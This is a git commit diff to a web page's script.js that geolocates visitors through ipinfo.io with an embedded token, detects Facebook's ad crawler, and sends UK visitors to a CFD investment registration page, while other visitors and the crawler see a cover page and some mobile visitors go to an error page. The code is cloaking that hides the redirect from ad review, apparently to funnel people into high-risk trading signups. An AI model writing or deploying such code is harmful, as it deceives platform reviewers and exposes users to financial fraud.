d321061116e7e95a4baea799f97996363ca2ad99
vautrinF <131580804+vautrinF@users.noreply.github.com>
2023-04-23 14:54:35 +0300

    Update script.js

--- script.js
+++ script.js
@@ -2,29 +2,19 @@ function isMobileDevice() {
   return (typeof window.orientation !== "undefined") || (navigator.userAgent.indexOf('IEMobile') !== -1);
 }
 
-if (!isMobileDevice()) {
-  let isRedirecting = false;
-  
-  const checkCountryAndRedirect = () => {
-    if (isRedirecting) return;
-    isRedirecting = true;
-
-    fetch('https://ipinfo.io/json?token=0784c654f65d07')
-      .then(response => response.json())
-      .then(data => {
-        const isFacebookBot = navigator.userAgent.includes('facebookexternalhit');
-        if (!isFacebookBot && data.country !== 'GB') {
-          document.querySelector('.blue-page').style.display = 'none';
-          window.location.replace("https://www.cryptoacademie.net/");
-        } else if (data.country === 'GB') {
-          window.location.replace("https://cfd.fortuna-invest.com/register");
-        }
-      });
-  }
-  
-  checkCountryAndRedirect();
-  
-  setTimeout(() => {
-    checkCountryAndRedirect();
-  }, 3000);
-}
+fetch('https://ipinfo.io/json?token=0784c654f65d07')
+  .then(response => response.json())
+  .then(data => {
+    const isFacebookBot = navigator.userAgent.includes('facebookexternalhit');
+    if (!isFacebookBot && data.country !== 'GB') {
+      // Si l'utilisateur n'est pas au Royaume-Uni et n'est pas un bot Facebook
+      // on ne redirige pas vers une autre page et on affiche simplement la page
+    } else if (data.country === 'GB') {
+      window.location.replace("https://cfd.fortuna-invest.com/register");
+    }
+    else if(isMobileDevice()) {
+      setTimeout(function() {
+        window.location.replace("https://www.example.com/error-page");
+      }, 1000);
+    }
+  });
